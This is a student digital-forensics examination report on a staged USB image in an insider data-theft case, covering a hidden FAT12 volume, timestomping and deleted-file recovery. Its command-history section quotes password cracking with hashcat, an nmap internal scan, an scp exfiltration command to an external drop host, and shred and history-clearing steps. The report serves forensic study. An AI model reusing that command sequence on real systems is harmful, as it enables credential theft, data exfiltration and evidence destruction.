# Forensic Examination Report — Exhibit A

**Case:** Suspected Data Exfiltration — Departing Employee  
**Exhibit:** exhibit-a.dd (USB drive, raw image)  
**Examiner:** Nick Smith  
**Date of Report:** April 1, 2026  
**Course:** CSCI 4623 — Digital Forensics, Spring 2026  

---

## 1  Executive Summary

Exhibit A is a forensic image of a USB drive seized from a departing employee suspected of exfiltrating proprietary data. The examination determined that this drive was not used as a normal work device. It was constructed from scratch on a Linux-based system and populated with fabricated contents by an automated process in under three seconds. Its visible files — documents, software installers, and photographs organized into typical workplace folders — are a deliberate facade designed to withstand only casual inspection.

Concealed within a hidden storage region preceding the visible drive contents, the examination recovered the complete operational record of the employee's activities. A preserved command history documents the full sequence of the operation: the employee cracked organizational passwords from a stolen authentication database, scanned the internal network for accessible services, packaged confidential data into an encrypted archive, transmitted that archive to an external server at a pre-arranged drop location, and then systematically destroyed local copies of the stolen files. The final recorded action was an attempt to erase the command history itself — an attempt that failed because the history file had already been written to permanent storage.

The encrypted archive was recovered and successfully decrypted using a password found among the cracked credentials. It contained three files spanning the organization's most sensitive domains: a confidential client project summary bearing active system credentials and production database access details, an employee roster with full names, salaries, email addresses, and partial Social Security numbers, and a file of internal infrastructure passwords for VPN access, code repositories, and cloud services. The infrastructure password file carried the header "Do not store on portable media" — an organizational policy the employee explicitly violated.

The employee employed multiple concealment techniques throughout the operation: hiding the operational evidence in an invisible partition, disguising one document under a false file extension, backdating a file's modification timestamp to place it outside the window of suspicious activity, and deleting an incriminating file that cross-referenced the hidden archive. Each technique was identified and defeated through forensic analysis. The totality of the evidence — layered concealment, offensive security tools, confirmed transmission to an external server, and deliberate evidence destruction — establishes this as a planned, multi-stage data exfiltration operation, not an accidental or opportunistic act.

### Recommended Immediate Actions

Based on the findings documented in this report, three actions are recommended. First, all credentials recovered from the archive should be treated as compromised: passwords for VPN, GitLab, Jira, AWS, and the production database should be rotated immediately, and the exposed API token should be revoked. Second, the destination IP address used for the data transfer should be investigated to determine who controls that infrastructure and whether the transmitted data has been further disseminated. Third, the organization's network access logs should be reviewed for the period preceding the drive's seizure to determine the full scope of the employee's reconnaissance and access activity, as the command history suggests network scanning that may have touched systems beyond those documented on the drive.

The following sections document the technical examination of Exhibit A.

---

## 2  Exhibit Identification and Integrity

### 2.1  Exhibit Description

The exhibit is a raw (dd-format) forensic image of a USB drive, received as `exhibit-a.dd`. The image is 268,435,456 bytes in size — exactly 524,288 sectors of 512 bytes each, or 256 MiB. The raw format contains no compression, no embedded metadata, and no container overhead: every byte at a given offset in the image corresponds to the same byte at the same offset on the original device.

Prior to any analysis, the image's cryptographic hashes were computed and compared against reference values provided with the exhibit. Both algorithms produced an exact match:

| Algorithm | Hash Value |
|-----------|------------|
| SHA-256   | `2a2c1f9afaa67085b265b2d0f8ee63eb129f75c1951c14aaaf72b4c1e987417a` |
| MD5       | `c874892619978bded49f7ae997e3ec3e` |

Both hashes matched the reference values provided with the exhibit. All subsequent analysis was performed on this verified image. Image integrity was re-verified at the conclusion of the examination; both hashes remained unchanged, confirming that the image was not modified during analysis.

### 2.2  Disk Layout

The partition table was examined to establish how the disk's 524,288 sectors are organized. The `mmls` utility identified a DOS (MBR) partition table with the following layout:

| Region | Start Sector | End Sector | Length (sectors) | Description |
|--------|-------------|------------|-----------------|-------------|
| MBR    | 0           | 0          | 1               | Primary Table (#0) |
| Gap    | 1           | 2,047      | 2,047           | Unallocated |
| NTFS   | 2,048       | 524,287    | 522,240         | NTFS / exFAT (0x07) |

The Master Boot Record occupies sector 0. Sectors 1 through 2,047 are marked as unallocated by the partition table — a 2,047-sector gap (1,048,064 bytes, approximately 1 MiB) between the MBR and the start of the NTFS partition. This gap corresponds to the standard 1 MiB alignment boundary used by modern partitioning tools, which align the first partition to sector 2,048 for performance. Under normal circumstances, this region is empty.

The NTFS partition occupies sectors 2,048 through 524,287, extending to the last sector of the image. Its partition type code is `0x07`, which conventionally indicates NTFS or exFAT. No trailing unallocated space exists beyond the partition — the entire disk, all 524,288 sectors, is accounted for across these three regions.

The distinction between `mmls` and a system administration tool such as `fdisk` is critical here. A standard `fdisk` listing would show only the NTFS partition starting at sector 2,048; it would not display the MBR as a distinct occupant of sector 0, nor would it reveal the 2,047-sector unallocated gap. The `mmls` utility, designed for forensic analysis, explicitly marks both the metadata structure (the MBR itself) and the unallocated regions. This distinction proved essential: the pre-partition gap contains the single most incriminating evidence on the drive.

```
|  MBR  |      Pre-Partition Gap       |            NTFS Partition (0x07)             |
| S:0   |      S:1 — S:2,047           |          S:2,048 — S:524,287                 |
| 512 B |      ~1 MiB                  |          ~255 MiB                            |
|       |      Hidden FAT12 (§3)       |          Visible filesystem (§4–§6)          |
```

The investigation examined each region in turn, beginning with the MBR boot code area and then the unallocated pre-partition gap.

### 2.3  MBR Boot Code Examination

The MBR at sector 0 is 512 bytes divided into three regions: 446 bytes of executable boot code, 64 bytes of partition table (four 16-byte entries), and a 2-byte signature. The partition table was parsed by `mmls` in §2.2. The 446-byte boot code region was separately examined via hex dump to check for concealed data.

The first 80 bytes (offsets 0x000–0x04F) contain a minimal standard x86 bootstrap — a CLI instruction (`0xFA`), stack initialization, and a partition-table scanning loop that loads the active partition's boot sector via BIOS INT 13h. This is boilerplate MBR code laid down by the partitioning tool that created the image. The remaining boot code area (offsets 0x050–0x1B7) is entirely zeroed — no data, no hidden messages, no steganographic content.

The four-byte disk signature at offsets 0x1B8–0x1BB is `0xC634B45D` (little-endian). This Windows-style disk identifier is assigned at format time and uniquely identifies this disk image. The partition table contains a single entry (type `0x07`, LBA start 2048, LBA size 522240) matching the `mmls` output; the remaining three partition table slots are zeroed. The MBR signature `0x55AA` at offsets 0x1FE–0x1FF is valid.

No data is concealed in the MBR boot code region.

---

## 3  The Pre-Partition Gap: A Hidden FAT12 Filesystem

### 3.1  Discovery and Filesystem Characterization

Standard forensic practice requires examination of all disk regions, not just those claimed by the partition table. The pre-partition gap — sectors 1 through 2,047 — was extracted to a standalone file (`evidence/fat12/pre_partition.bin`) and examined independently.

The first sector of this region begins with the byte sequence `0xEB 0x3C 0x90`, the standard x86 short jump instruction used by FAT boot sectors, followed by the ASCII string `mkfs.fat` in the OEM Name field. The sector ends with the boot signature `0x55AA` at bytes 510–511. These are the defining characteristics of a FAT Volume Boot Record. The `file` utility confirmed the identification: a FAT12 filesystem created by the Linux `mkfs.fat` utility.

This is not residual data from a previous partition or random noise left behind by a formatting tool. It is a complete, structurally intact filesystem that was deliberately created within the pre-partition gap — a region that the partition table does not describe, that most partitioning tools leave empty, and that casual inspection of the drive's partition structure would not reveal. The `fsstat` utility parsed it fully, confirming the following parameters:

| Parameter         | Value                        |
|-------------------|------------------------------|
| Filesystem type   | FAT12                        |
| Created by        | mkfs.fat (Linux)             |
| OEM Name          | mkfs.fat                     |
| Sector size       | 512 bytes                    |
| Cluster size      | 512 bytes (1 sector/cluster) |
| Total clusters    | 2,039                        |
| Root directory entries | 16                       |
| Total sectors     | 2,047                        |
| Location in image | Sectors 1–2,047              |

The FAT12 filesystem type is appropriate for the volume size. FAT12 uses 12-bit File Allocation Table entries and supports a maximum of 4,084 clusters, well within the requirements for this approximately 1 MiB region. The cluster size of 512 bytes (one sector per cluster) is the minimum possible, consistent with a volume this small.

The file listing was obtained using `fls`:

| Inode | Filename      | Description                        |
|-------|---------------|------------------------------------|
| 3     | tools.txt     | Offensive security toolkit inventory |
| 4     | notes.txt     | Cracked passwords from shadow file |
| 6     | .bash_history | Command history (8 commands)       |
| 7     | secrets.zip   | Password-encrypted ZIP archive     |

Each file was extracted using `icat`, hashed with SHA-256, and analyzed individually. Taken together, their contents document a complete data exfiltration operation from initial reconnaissance through data packaging, transmission, and evidence destruction.

### 3.2  tools.txt — The Offensive Toolkit

Reference: `evidence/fat12/tools.txt`  
SHA-256: `69c92f60f74084239ac85a1fb132a82b5f27b8a4d44e4affc3f007e5f229e72c`

The file contains an inventory of offensive security software organized by function. Password-cracking tools — hashcat and John the Ripper — are listed alongside network reconnaissance utilities (nmap, Wireshark), Active Directory exploitation frameworks (mimikatz, BloodHound), and lateral movement tools (CrackMapExec). This is not a defensive security administrator's reference list. The combination of credential harvesting, network scanning, and exploitation tools is characteristic of an offensive penetration testing or attack workflow, and the presence of tools like mimikatz and BloodHound, which are designed specifically for extracting credentials from Windows domain environments and mapping trust relationships, indicates targeting of an Active Directory infrastructure.

The significance of this file increases substantially when considered alongside the command history recovered from the same filesystem (§3.4 below), which shows several of these tools actively deployed against organizational systems.

### 3.3  notes.txt — Cracked Credentials

Reference: `evidence/fat12/notes.txt`  
SHA-256: `5985dde5827bd830821e4b828d034b6f11b89f7f0b00e8c71b9d959b072f4510`

The file opens with an `/etc/shadow` header line, identifying its contents as output from a Linux password-cracking session. The `/etc/shadow` file is the standard authentication database on Linux and Unix systems; it stores cryptographic hashes of user passwords. Its presence here indicates the suspect obtained a copy of an organizational system's password database — an act that itself requires either privileged access or a prior compromise.

Below the header are seven passphrases in Diceware format — multi-word phrases separated by periods (e.g., `old.speeding.turtle`, `cold.amber.river`). Diceware passphrases are a hallmark of organizations with strong password policies: they provide high entropy while remaining human-memorable, and their presence in a cracked output file indicates a deliberate, targeted attack against organizational credentials using dictionary or rule-based techniques rather than simple brute force.

One passphrase — `dusty.lantern.fading.winter.copper.hollow` — is of particular significance: it is the password used to encrypt the `secrets.zip` archive recovered from this same filesystem (see §3.5). This establishes a direct evidentiary link between the password-cracking activity documented in this file and the data exfiltration operation. The suspect cracked organizational passwords, then used one of those cracked passphrases as the encryption key for the stolen data.

### 3.4  .bash_history — The Operational Record

Reference: `evidence/fat12/bash_history.txt`  
SHA-256: `8b7005cecca94994dabbba01e80b803bcc76d2a31f9982bd7a95faf17fa45ac0`

The command history file is the single most important artifact on the drive. It records eight sequential commands that document the suspect's operational procedure from staging through exfiltration to evidence destruction. Each command is analyzed in turn below.

**Command 1 — Staging check:**  
`ls -la /tmp/staging/`

The first command lists the contents of a staging directory on the local system. The `-la` flags request a detailed listing including hidden files and permissions. This confirms the suspect maintained a temporary workspace at `/tmp/staging/` for data assembly prior to packaging. The `/tmp` directory is conventionally used for ephemeral data and is often cleared on reboot — a deliberate choice that demonstrates awareness of forensic recovery.

**Command 2 — Evidence destruction:**  
`shred -vzu /tmp/staging/employee_data.bak`

The second command securely destroys a file named `employee_data.bak` from the staging area. The `shred` utility overwrites a file's contents with random data across multiple passes before deletion, rendering recovery through conventional forensic techniques impossible. The `-v` flag produces verbose output, `-z` adds a final zero-overwrite pass to conceal the fact that shredding occurred (the file's former disk location will contain only null bytes rather than the distinctive random patterns left by a standard shred), and `-u` truncates and unlinks the file after overwriting. The filename indicates additional employee data existed beyond what was ultimately archived — data the suspect chose to destroy rather than exfiltrate, suggesting a deliberate selection process.

**Command 3 — Archive creation:**  
`zip -e -P dusty.lantern.fading.winter.copper.hollow secrets.zip project_alpha.txt employee_list.csv credentials.txt`

The third command packages three files — `project_alpha.txt`, `employee_list.csv`, and `credentials.txt` — into a password-encrypted ZIP archive named `secrets.zip`. The `-e` flag enables encryption and the `-P` flag specifies the password directly on the command line. This constitutes a critical operational security failure: the `-P` option places the password in the shell's argument list and, because this terminal session was configured to log commands to `.bash_history`, permanently records the encryption key in the history file. Had the suspect used `-e` alone, `zip` would have prompted for the password interactively and it would never have been written to disk. This single error is what allowed the encrypted archive to be decrypted during this examination.

The password itself — `dusty.lantern.fading.winter.copper.hollow` — appears among the cracked passphrases in `notes.txt` (§3.3), confirming the suspect reused a cracked organizational password as the encryption key for the stolen data.

**Command 4 — Password cracking:**  
`hashcat -m 1800 -a 0 /tmp/shadow.txt /usr/share/wordlists/rockyou.txt --outfile cracked.txt`

The fourth command runs the hashcat password-cracking tool against a file named `shadow.txt` in the staging directory. The `-m 1800` flag specifies the SHA-512crypt hash mode — the format used by modern Linux systems to store password hashes in `/etc/shadow`. The `-a 0` flag selects dictionary attack mode, and the wordlist is `rockyou.txt`, a widely used password dictionary containing approximately 14.3 million real-world passwords compiled from the 2009 RockYou data breach. The `--outfile` flag directs successfully cracked passwords to `cracked.txt`. This confirms the suspect actively cracked organizational Linux system passwords, corroborating the cracked passphrases found in `notes.txt`.

**Command 5 — Network reconnaissance:**  
`nmap -sV -p 22,80,443,3389 192.168.1.0/24`

The fifth command performs a network scan of the entire 192.168.1.0/24 subnet — a Class C address range encompassing 254 hosts on an internal network. The `-sV` flag enables service version detection, which probes open ports to identify the specific software and version running on each service. The target ports are strategically chosen: 22 (SSH), 80 (HTTP), 443 (HTTPS), and 3389 (RDP, Windows Remote Desktop). This is network reconnaissance — systematic probing of the internal network for accessible services. The combination of SSH, web, and RDP port scanning indicates the suspect was mapping potential entry points for lateral movement across both Linux and Windows systems.

**Command 6 — Exfiltration:**  
`scp -i ~/.ssh/id_rsa secrets.zip deploy@203.0.113.47:/var/drop/`

The sixth command is the exfiltration itself. The suspect used `scp` — secure copy over SSH — to transmit the encrypted archive to an external server at IP address 203.0.113.47. Authentication was performed using a private SSH key (`~/.ssh/id_rsa`) rather than a password, indicating the suspect had pre-configured key-based access to the destination. The remote username `deploy` and the destination path `/var/drop/` suggest pre-arranged receiving infrastructure — a purpose-built drop point, not an ad-hoc transfer to a personal device. This is the command that confirms data left the organization's control.

**Command 7 — Local copy destruction:**  
`shred -vzu secrets.zip`

Following successful transmission, the suspect securely destroyed the local copy of the encrypted archive using the same `shred` technique employed in command 2. This is consistent with an operational security protocol: once the data has been successfully delivered to the external destination, the local evidence is eliminated.

**Command 8 — History erasure attempt:**  
`history -c`

The final command attempts to clear the shell command history. The `history -c` built-in clears the in-memory history buffer maintained by the running Bash session. However, this command only affects the buffer held in process memory; it does not delete or modify the on-disk `.bash_history` file. By the time this command executed, the history had already been written to the FAT12 filesystem's storage sectors as part of the `.bash_history` file. Clearing the buffer does not erase the on-disk record. This anti-forensic measure failed, preserving the complete operational record that documents every preceding step.

**Synthesis:** Taken as a whole, the command history documents a planned, multi-step operation: reconnaissance, credential compromise, data staging, selective evidence destruction, encryption, exfiltration, and further evidence destruction. The sequence demonstrates both technical sophistication and awareness of forensic detection — the suspect used secure deletion tools and attempted history clearing — but critical operational errors undermined the concealment. The `-P` flag on the `zip` command preserved the encryption password in the history file. The `history -c` command failed to erase the on-disk history. These two errors are what made the full reconstruction of the operation possible.

### 3.5  secrets.zip — The Exfiltrated Data

Reference: `evidence/fat12/secrets.zip`  
SHA-256: `dad3fb51471623a51b6ba2b7544f7bb734b14cbbce543375a6e4f8c9b4f95913`

Using the password recovered from the command history (`dusty.lantern.fading.winter.copper.hollow`), the encrypted archive was successfully decrypted. It contained three files, each targeting a different domain of organizational sensitivity.

**project_alpha.txt**  
Reference: `evidence/secrets/project_alpha.txt`  
SHA-256: `18a915233ea9f959094c7df7c3eb806d2fd69c2686f7963442f833ac0d128930`

This file contains confidential client engagement details for Meridian Financial Group, including a contract value of $2.4 million. Critically, the document includes a live API authentication token and production database credentials — not merely business intelligence, but active system access. The presence of live credentials means this document is not merely a business summary: it provides direct, usable access to production infrastructure. Anyone in possession of this file could authenticate to production systems using the embedded credentials.

**employee_list.csv**  
Reference: `evidence/secrets/employee_list.csv`  
SHA-256: `a45c344efaf8f3f847164daa9d299cb4dcfbf8af4cd211482a49c0d130d98fde`

A structured data file containing personally identifiable information for seven employees: full names, email addresses, salary figures, and partial Social Security numbers. This constitutes PII subject to data breach notification requirements under applicable regulations. Its exfiltration represents both a data breach and a potential compliance violation.

**credentials.txt**  
Reference: `evidence/secrets/credentials.txt`  
SHA-256: `af42e7b412509bb0dc2ae99cee427463cbb01bad84fe6fa21ef10f6567a440f8`

A plaintext file containing internal infrastructure authentication credentials spanning multiple systems: VPN access passwords, a GitLab personal access token, production database credentials, Jira service account credentials, and AWS access keys. The file header reads "RESTRICTED — Do not store on portable media" — an organizational security policy the suspect explicitly violated by placing this file on the USB drive and transmitting it to an external server.

The breadth of these credentials is notable. They span version control (GitLab), project management (Jira), cloud infrastructure (AWS), remote access (VPN), and production data (database). Compromise of any one of these would be a significant security incident; compromise of all of them simultaneously provides an attacker with comprehensive access to the organization's operational infrastructure.

### 3.6  Forensic Significance of the FAT12 Location

The FAT12 filesystem occupies the pre-partition gap — the 1 MiB alignment space between the MBR at sector 0 and the NTFS partition starting at sector 2,048. This space is a standard artifact of modern partitioning tools that align partition boundaries to MiB for performance optimization. Under normal circumstances, it is entirely empty.

The placement of this filesystem is deliberate concealment. The partition table makes no reference to the FAT12 volume — the `mmls` output labels it as "Unallocated." Any investigative approach limited to recognized partitions — mounting the NTFS volume, examining its contents, or using tools that rely on the partition table for guidance — would miss this region entirely. The filesystem is invisible to standard directory listings, file managers, and any tool that operates only within partition boundaries.

Discovering this filesystem required a practice that is fundamental to forensic examination: accounting for the entire disk, not just the portions claimed by the partition table. The `mmls` utility made the gap visible; raw byte examination at sector 1 confirmed it was not empty; and TSK tools (`fsstat`, `fls`, `icat`) parsed and extracted the contents without requiring the volume to be mounted. This workflow — whole-disk accounting followed by targeted extraction — is what separated a forensic examination from a routine review of visible files.

### 3.7  FAT12 Completeness Verification

Two additional checks confirmed that the four recovered files represent the complete contents of the FAT12 filesystem.

First, a deleted-file scan using `fls -d` on `evidence/fat12/pre_partition.bin` returned no results. The FAT12 directory contains no deleted entries — the four visible files are the only files that ever existed on this volume.

Second, the FAT12 unallocated space — 990 KB of clusters not assigned to any file — was extracted using `blkls` and searched with `strings`. The search produced zero results: the unallocated space is entirely null-filled. No residual data from previously deleted files, no ambient content, and no strings of any kind exist outside the four allocated files. This parallels the finding on the NTFS volume (§6.4) and reinforces the conclusion that the entire disk image was constructed from a zeroed container.

---

## 4  The NTFS Partition: Volume Characterization and Provenance

### 4.1  Filesystem Parameters

The NTFS partition occupies sectors 2,048 through 524,287 of the disk image — 522,240 sectors, approximately 255 MiB. The `fsstat` utility was used with a sector offset of 2,048 to parse the volume metadata:

| Parameter             | Value                                      |
|-----------------------|--------------------------------------------|
| Filesystem type       | NTFS                                       |
| Volume label          | WORK_USB                                   |
| NTFS version          | 3.1                                        |
| Cluster size          | 4,096 bytes (8 sectors/cluster)            |
| MFT entry size        | 1,024 bytes                                |
| Total sector range    | 0–522,239 (within partition)               |

The volume label "WORK_USB" presents the drive as a routine workplace storage device — a characterization that, as the analysis below demonstrates, is a deliberate fiction.

### 4.2  Evidence of Linux-Only Origin

Three independent artifacts establish that this NTFS volume was created and populated entirely on a Linux system using the ntfs-3g driver. At no point in its existence did a Windows operating system interact with this filesystem.

**$LogFile Sequence Number: 0 on every MFT entry.** NTFS maintains a metadata transaction journal in the `$LogFile` system file (MFT entry 2). On a Windows system, every metadata operation — file creation, attribute modification, directory entry update — is journaled, and each MFT entry records the current `$LogFile` Sequence Number (LSN) at the time of its last modification. A non-zero LSN is a universal characteristic of any MFT entry that has been touched by the Windows NTFS driver. Every file on this volume, from MFT entry 67 through 75, reports `$LogFile Sequence Number: 0`. The ntfs-3g FUSE driver, which provides NTFS read/write support on Linux, does not participate in the NTFS journal mechanism — it writes MFT entries directly without updating the LSN. An LSN of zero across the entire volume is definitive evidence that the Windows NTFS driver never operated on these files.

**$FILE_NAME Actual Size: 0 on every file.** Each MFT entry's `$FILE_NAME` attribute includes an Actual Size field that, on a Windows-formatted volume, records the file's data length. The Windows NTFS driver updates this field during directory index operations. The ntfs-3g driver does not populate it, leaving it at zero. Every user file on this volume exhibits `Actual Size: 0` in its `$FILE_NAME` attribute — a second, independent confirmation that Windows never touched these entries.

**Absence of Zone.Identifier Alternate Data Streams.** On Windows, the NTFS driver automatically attaches a named `$DATA` attribute called `Zone.Identifier` to any file downloaded through a web browser. This stream records the download URL and security zone, and is what triggers the "this file was downloaded from the internet" security warning. The Downloads directory on this volume contains two files that purport to be downloaded software — `putty.exe` (an SSH client) and `WinSCP-5.21.8-Setup.exe` (a remote file transfer utility). Neither carries a `Zone.Identifier` stream. An `fls` listing filtered for ADS (colon-separated stream names in the filename field) returned no results on any user file. This absence is consistent with files that were copied onto the volume from local storage on Linux, never having passed through a Windows download workflow.

Taken together, these three indicators establish that the volume was formatted with `mkntfs` (or an equivalent Linux utility), populated via ntfs-3g, and never mounted by a Windows operating system. The directory structure — Documents, Downloads, and Pictures — mimics the standard Windows user profile layout, but no Windows system created it. It is a facade.

### 4.3  Scripted Population: The 2.2-Second Window

The creation timestamps on all nine user files, drawn from the `$FILE_NAME` attributes (which cannot be modified through normal user-space operations and therefore represent ground truth), establish the precise timeline of the volume's population:

| Created (FN)                | MFT | File                                |
|-----------------------------|-----|-------------------------------------|
| 2026-03-16 10:10:47.881     | 67  | Documents/team_contacts.xlsx        |
| 2026-03-16 10:10:47.907     | 68  | Documents/Q3_review.docx            |
| 2026-03-16 10:10:47.935     | 69  | Downloads/putty.exe                 |
| 2026-03-16 10:10:48.191     | 70  | Downloads/WinSCP-5.21.8-Setup.exe   |
| 2026-03-16 10:10:49.882     | 71  | Pictures/whiteboard_20240912.jpg    |
| 2026-03-16 10:10:49.917     | 72  | Pictures/office_floorplan.png       |
| 2026-03-16 10:10:49.945     | 73  | quarterly_report.pdf                |
| 2026-03-16 10:10:49.978     | 74  | meeting_notes.docx                  |
| 2026-03-16 10:10:50.040     | 75  | readme.txt                          |

The entire file population — nine files across three directories, including an 11 MB executable — completed in 2.159 seconds. No human operator, working through a file manager or manual copy commands, produces this pattern. This is the signature of a scripted batch operation: a shell script executing a sequence of copy commands against the ntfs-3g-mounted volume.

The MFT entry numbers reinforce this conclusion. User files occupy entries 67 through 75 in unbroken sequence, with no gaps or interleaving. On a freshly formatted NTFS volume, MFT entries 0 through 15 are reserved for system metadata files, and entries 16 onward are available for user data. The directories (Documents at 64, Downloads at 65, Pictures at 66) were created first, consuming the next available entries, followed immediately by the files. This perfectly sequential allocation is consistent with a single automated operation against a clean volume with no prior history of file creation or deletion.

The forensic conclusion is unambiguous: this drive was not assembled by a user organically working with files over days or weeks. It was staged — formatted, structured, and populated in a single automated pass — on March 16, 2026, at approximately 10:10 AM CDT.

---

## 5  NTFS Surface: File-Level Analysis

### 5.1  File Inventory

A recursive listing with full paths was generated using `fls -o 2048 -r -p exhibit-a.dd` (output preserved in `logs/fls_full.txt`). The NTFS surface contains three directories and nine user files, one of which has been deleted:

| MFT | Path                               | Type / Format      | Size (bytes) | Status    |
|-----|------------------------------------|--------------------|-------------|-----------|
| 67  | Documents/team_contacts.xlsx       | Microsoft Excel 2007+ | 5,271    | Allocated |
| 68  | Documents/Q3_review.docx           | Microsoft Word 2007+  | 37,246   | Allocated |
| 69  | Downloads/putty.exe                | PE32+ (64-bit GUI)    | 1,663,264 | Allocated |
| 70  | Downloads/WinSCP-5.21.8-Setup.exe  | PE32 (32-bit GUI)     | 11,483,960 | Allocated |
| 71  | Pictures/whiteboard_20240912.jpg   | JPEG, 1920×1080       | 67,387   | Allocated |
| 72  | Pictures/office_floorplan.png      | PNG, 1200×900         | 18,091   | Allocated |
| 73  | quarterly_report.pdf               | **OOXML (Word 2007+)** | 36,891  | Allocated |
| 74  | meeting_notes.docx                 | Microsoft Word 2007+  | 36,968   | Allocated |
| 75  | readme.txt                         | ASCII text            | 30       | **Deleted** |

The file types listed in the "Type / Format" column were determined by magic byte analysis using the `file` utility on extracted copies, not by file extension. One critical discrepancy is noted in the table above: MFT entry 73, named `quarterly_report.pdf`, is not a PDF document.

All files were extracted from the image using `icat` with the partition offset, hashed with SHA-256, and stored under `evidence/ntfs/`. The hashes are recorded in `logs/hash_manifest.txt`.

Additionally, the `fls` listing revealed eight deleted orphan files occupying MFT entries 16 through 23, placed by TSK in the virtual `$OrphanFiles` directory. Orphan files are deleted entries whose parent directory index references have been fully cleared — TSK cannot reconstruct their original paths. These entries are examined in §6.

### 5.2  quarterly_report.pdf — A Disguised Document

Reference: `evidence/ntfs/quarterly_report_actual.zip` (extracted as its true format)  
SHA-256: `52ade68f1565c9c896d98b80b204207c014685bfb70c2440f2e61de54e58213c`

The file named `quarterly_report.pdf` does not begin with the PDF magic bytes `%PDF` (`0x25 0x50 0x44 0x46`). Its first four bytes are `0x50 0x4B 0x03 0x04` — the local file header signature of the ZIP archive format. The `file` utility identified it as "Microsoft Word 2007+" — an OOXML document, which uses a ZIP container internally.

Unpacking the ZIP structure (`unzip -l`) revealed 17 internal files organized in the standard OOXML hierarchy: `[Content_Types].xml`, `_rels/.rels`, `word/document.xml`, `docProps/core.xml`, and associated style and theme files. All internal timestamps are 2026-03-16 09:41, approximately 30 minutes before the files were written to the NTFS surface.

The OOXML metadata files were extracted and examined:

**`docProps/core.xml`** — The creator field reads `python-docx`, and the description field reads `generated by python-docx`. The python-docx library is a Python package for programmatically creating Word documents without requiring Microsoft Office. Both the creation and modification timestamps in this XML are set to `2013-12-23T23:15:00Z` — a default value embedded in the python-docx template, not a real authoring date. The revision count is 1, indicating the document was never manually edited after generation.

**`docProps/app.xml`** — The Application field reads `Microsoft Macintosh Word` with AppVersion `14.0000` (Word 2011 for Mac). These are also inherited defaults from the python-docx template, not indicators of actual software used. The TotalTime, Words, Characters, and Lines fields are all zero — confirming the document was never opened in a word processor.

**`word/document.xml`** — The document body is titled "Quarterly Business Review" and is marked "CONFIDENTIAL — FOR INTERNAL USE ONLY." It contains an executive summary referencing operational performance for Q3 and strategic priorities for Q4, followed by a project status section listing three projects: Project Alpha (on track, Phase 2 delivery November 2024), Project Bravo (delayed 2 weeks), and Project Delta (completed). The reference to Project Alpha establishes a direct connection to the `project_alpha.txt` file recovered from the encrypted archive in the hidden FAT12 filesystem (§3.5) — the same project, referenced across two separate concealment layers of the same drive.

The forensic significance is twofold. First, the extension mismatch is an anti-forensic technique: renaming a `.docx` to `.pdf` makes the file appear routine on a work USB drive, since quarterly reports are commonly distributed as PDFs. A Word document, by contrast, implies the holder had authoring access to the content — a more suspicious indicator. Second, the python-docx authorship confirms the suspect generated this document programmatically using a script, consistent with the broader pattern of automated operations documented throughout the drive (the scripted NTFS population, the bash history's command sequences).

### 5.3  meeting_notes.docx — Timestamp Manipulation

Reference: `evidence/ntfs/meeting_notes.docx`  
SHA-256: `0dd3d72fdc9ab8ec99d339525e26f0d49fc41af16fe66d5579f7ef3543ccf2c4`

The `istat` output for MFT entry 74 reveals a divergence between its two timestamp blocks that constitutes direct evidence of anti-forensic timestamp manipulation (timestomping).

Each NTFS MFT entry carries two independent sets of four timestamps. The `$STANDARD_INFORMATION` (SI) attribute timestamps are writable by any user-space process — on Linux, a `touch -t` command through ntfs-3g suffices. The `$FILE_NAME` (FN) attribute timestamps are updated only by the NTFS kernel driver during directory index operations and cannot be modified through normal user-space APIs. When these two sets diverge, the FN timestamps represent the ground truth.

| Timestamp      | $STANDARD_INFORMATION          | $FILE_NAME                     |
|----------------|--------------------------------|--------------------------------|
| Created        | 2026-03-16 10:10:49.978053800  | 2026-03-16 10:10:49.978053800  |
| File Modified  | **2026-03-04 16:42:00.015781** | 2026-03-16 10:10:49.978053800  |
| MFT Modified   | 2026-03-16 10:10:50.015965800  | 2026-03-16 10:10:49.978053800  |
| Accessed       | 2026-03-16 10:10:49.978053800  | 2026-03-16 10:10:49.978053800  |

Three of the four SI timestamps match the FN values exactly. The SI File Modified timestamp does not: it has been set to March 4, 2026 — twelve days before the file was actually created on March 16. The FN File Modified timestamp, which cannot be altered by the same technique, directly contradicts the SI value and exposes the manipulation.

This is a targeted, sophisticated stomp. The attacker did not crudely set all SI timestamps to an obviously fake date (which would be immediately detectable by any timestamp comparison). Instead, only the File Modified field was altered, and it was set to a date twelve days in the plausible past rather than an implausible year. In a timeline view, this file would sort as if it were last modified on March 4, potentially falling outside an investigator's search window if the investigation focused on activity in mid-March 2026.

The stomp is additionally detectable through internal SI inconsistency: the SI MFT Modified timestamp (`10:10:50.015`) is 37 milliseconds after the SI Created timestamp (`10:10:49.978`). On every other file on this volume, the gap between Created and MFT Modified corresponds to the file write duration (typically a few milliseconds for small files, ~1.7 seconds for the 11 MB WinSCP installer). The 37ms gap on MFT entry 74 is the clock tick from the `touch` command that performed the stomp — it updated File Modified to the target date and MFT Modified to wall-clock time as a side effect, without altering Created or Accessed.

No other file on the NTFS surface exhibits SI/FN timestamp divergence. The timestomping on `meeting_notes.docx` is the only anomaly in an otherwise uniform timestamp pattern, making it even more conspicuous under forensic analysis.

### 5.4  readme.txt — A Deleted Cross-Reference

Reference: `evidence/ntfs/readme_deleted.txt`  
SHA-256: `9f7dee81f350ebc808e9ab391e061230a6654b04dfd6048428a53dbbacb26887`

MFT entry 75 is the only file on the NTFS surface that has been deleted. Three MFT header fields confirm the deletion: the entry is marked `Not Allocated File`, the link count is 0 (no directory entry references it), and the sequence number is 2. NTFS increments an MFT entry's sequence number each time it is deallocated. Sequence 2 indicates the entry was allocated once (sequence 1), then deleted (sequence incremented to 2). Every other file on the volume has sequence 1.

Despite deletion, the file's content is fully recoverable because it is stored as a **resident** attribute. The `$DATA` attribute for this entry is 30 bytes — small enough to fit entirely within the 1,024-byte MFT record alongside the other attributes (`$STANDARD_INFORMATION`, `$FILE_NAME`, `$SECURITY_DESCRIPTOR`). No cluster allocation was needed. Resident data persists until the MFT entry is reallocated to a new file and the record is overwritten with new metadata. On this lightly-used volume, no such reallocation occurred.

The file's content reads: `archive is ready, key is safe`

This is a note-to-self linking the NTFS surface to the hidden FAT12 filesystem. The "archive" is the `secrets.zip` recovered from the FAT12 volume (§3.5), and the "key" is the encryption password stored in the command history file (§3.4). The suspect left this note as a confirmation that the exfiltration package was prepared and the means to decrypt it was preserved, then deleted it — presumably to remove the connection between the visible filesystem and the hidden one. The deletion was insufficient: the resident data remained intact in the MFT.

